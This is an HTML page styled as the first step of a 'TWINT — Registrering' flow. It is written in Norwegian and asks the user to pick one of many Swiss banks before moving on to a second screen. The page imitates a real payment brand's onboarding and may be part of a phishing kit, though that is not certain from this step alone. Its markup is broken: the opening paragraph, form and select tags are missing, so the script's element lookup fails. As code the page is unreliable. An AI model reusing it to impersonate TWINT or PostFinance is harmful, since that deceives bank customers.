<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT — Registrering</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 0;
      }

      .iphone-shell {
        width: min(420px, 100%);
        min-height: 100vh;
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.2);
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 33%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.5rem;
        font-size: 1.75rem;
      }

      .copy {
        margin: 0 0 1.5rem;
        line-height: 1.6;
        color: #475569;
      }

      .bank-select {
        width: 100%;
        margin-bottom: 0.75rem;
      }

      select {
        width: 100%;
        padding: 0.95rem 1.25rem;
        font-size: 1rem;
        font-weight: 600;
        color: #0f172a;
        border-radius: 12px;
        border: 1px solid #e2e8f0;
        background: #fff;
        appearance: none;
        -webkit-appearance: none;
        background-image: linear-gradient(45deg, transparent 50%, #0f172a 50%),
          linear-gradient(135deg, #0f172a 50%, transparent 50%);
        background-position: calc(100% - 1rem) calc(50% - 0.5rem), calc(100% - 0.6rem) calc(50% - 0.5rem);
        background-size: 0.45rem 0.45rem, 0.45rem 0.45rem;
        background-repeat: no-repeat;
      }

      option {
        font-weight: 500;
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: 1rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }
    </style>
  </head>
  <body>
    <div class="iphone-shell">
      <div class="step">
        <div class="step-label">Step 1/3</div>
        <div class="step-progress">
          <div class="progress-bar"><span></span></div>
          <strong>Step 1/3</strong>
        </div>
      </div>

      <h1>Velg bank</h1>

        Velg banken du ønsker å bruke med PostFinance TWINT. Du kan enkelt bytte mellom PostFinance og andre banker senere dersom du ønsker det.
      </p>

            <option value="Baloise">Baloise</option>
            <option value="Banca Populare di Sondrio">Banca Populare di Sondrio</option>
            <option value="BancaStato">BancaStato</option>
            <option value="Bank Avera">Bank Avera</option>
            <option value="Bank BSU">Bank BSU</option>
            <option value="Bank Cler">Bank Cler</option>
            <option value="Bank EEK">Bank EEK</option>
            <option value="Bank EKI">Bank EKI</option>
            <option value="Bank Gantrisch">Bank Gantrisch</option>
            <option value="Bank Leerau">Bank Leerau</option>
            <option value="Bank SLM">Bank SLM</option>
            <option value="Bank Thalwil">Bank Thalwil</option>
            <option value="Bank WIR">Bank WIR</option>
            <option value="Bank Zimmerberg">Bank Zimmerberg</option>
            <option value="Banque Cantonale de Fribourg">Banque Cantonale de Fribourg</option>
            <option value="Banque Cantonale de Genève">Banque Cantonale de Genève</option>
            <option value="Banque Cantonale du Jura">Banque Cantonale du Jura</option>
            <option value="Banque Cantonale Neuchâteloise">Banque Cantonale Neuchâteloise</option>
            <option value="Banque Cantonale du Valais">Banque Cantonale du Valais</option>
            <option value="Banque du Léman">Banque du Léman</option>
            <option value="Basellandschaftliche Kantonalbank">Basellandschaftliche Kantonalbank</option>
            <option value="Basler Kantonalbank">Basler Kantonalbank</option>
            <option value="Bernerland Bank">Bernerland Bank</option>
            <option value="Berner Kantonalbank">Berner Kantonalbank</option>
            <option value="Bezirks-Sparkasse Dielsdorf">Bezirks-Sparkasse Dielsdorf</option>
            <option value="CA next bank">CA next bank</option>
            <option value="Clientis Bank Oberuzwil">Clientis Bank Oberuzwil</option>
            <option value="Clientis Biene Bank im Rheintal">Clientis Biene Bank im Rheintal</option>
            <option value="Clientis Caisse d’Epargne Courtelary">Clientis Caisse d’Epargne Courtelary</option>
            <option value="Clientis Sparcassa 1816">Clientis Sparcassa 1816</option>
            <option value="Ersparniskasse Schaffhausen">Ersparniskasse Schaffhausen</option>
            <option value="Glarner Kantonalbank">Glarner Kantonalbank</option>

            <option value="Hypothekarbank Lenzburg">Hypothekarbank Lenzburg</option>

            <option value="Nidwaldner Kantonalbank">Nidwaldner Kantonalbank</option>
            <option value="Obwaldner Kantonalbank">Obwaldner Kantonalbank</option>
            <option value="Radicant">Radicant</option>
            <option value="Regiobank Männedorf">Regiobank Männedorf</option>
            <option value="Regiobank Solothurn">Regiobank Solothurn</option>
            <option value="Saanen Bank">Saanen Bank</option>
            <option value="Schaffhauser Kantonalbank">Schaffhauser Kantonalbank</option>
            <option value="Schwyzer Kantonalbank">Schwyzer Kantonalbank</option>
            <option value="Spar- und Leihkasse Bucheggberg">Spar- und Leihkasse Bucheggberg</option>
            <option value="Spar- und Leihkasse Frutigen">Spar- und Leihkasse Frutigen</option>
            <option value="Sparkasse Schwyz">Sparkasse Schwyz</option>
            <option value="St. Galler Kantonalbank">St. Galler Kantonalbank</option>
            <option value="Swissquote">Swissquote</option>
            <option value="Thurgauer Kantonalbank">Thurgauer Kantonalbank</option>
            <option value="Urner Kantonalbank">Urner Kantonalbank</option>
            <option value="Valiant">Valiant</option>
            <option value="VZ">VZ</option>
            <option value="Yuh">Yuh</option>
            <option value="Zuger Kantonalbank">Zuger Kantonalbank</option>
            <option value="Zürcher Landbank">Zürcher Landbank</option>
            <option value="Twint Prepaid">Twint Prepaid</option>
          </select>
        </div>

        <div class="buttons">
          <button type="button" class="primary" id="next-button" disabled>Neste</button>
          <button type="button" class="secondary" id="back-button">Tilbake</button>
        </div>
      </form>
      <script>
        const bankSelect = document.getElementById("bank-select");
        const nextButton = document.getElementById("next-button");
        const backButton = document.getElementById("back-button");

        bankSelect.addEventListener("change", () => {
          nextButton.disabled = !bankSelect.value;
        });

        nextButton.addEventListener("click", () => {
          if (!bankSelect.value) {
            alert("Velg en bank før du går videre.");
            return;
          }
          localStorage.setItem("selectedBank", bankSelect.value);
          window.location.href = "screen-2.html";
        });

        backButton.addEventListener("click", () => {
          window.location.href = "index.html";
        });
      </script>
    </div>
  </body>
</html>
